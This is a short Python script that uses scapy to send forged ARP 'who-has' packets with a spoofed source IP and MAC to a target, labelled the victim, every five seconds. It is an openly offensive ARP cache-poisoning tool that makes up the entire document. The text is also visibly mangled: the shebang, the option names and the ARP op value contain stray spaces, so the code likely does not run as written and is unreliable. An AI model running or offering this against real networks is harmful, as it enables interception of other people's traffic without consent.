# !/ usr / bin / python
# Usage :
# python arp . py -- dip 192.168.220.254 -- sip 192.168.220.1 -- smac 11:22:33:44:55:66

from scapy.all import *
import time
import argparse
import os
import sys

from scapy.layers.l2 import ARP


def sendARP(args):
    a = ARP()
    a.pdst = args.dip
    a.psrc = args.sip
    a.hwsrc = args.smac
    a.op = 'who-has '

    try:
        while 1:
            send(a, 1)
            time.sleep(5)
    except KeyboardInterrupt:
        pass


parser = argparse.ArgumentParser()
parser.add_argument('-- dip', required=True, help="IP to send the ARP (VITIM)")
parser.add_argument('-- sip', required=True, help="Source IP address of the ARP packet ( IP to be added )")
parser.add_argument('-- smac', required=True, help="SRC MAC address of the ARP packet ( MAC to be added ")
args = parser.parse_args()
sendARP(args)
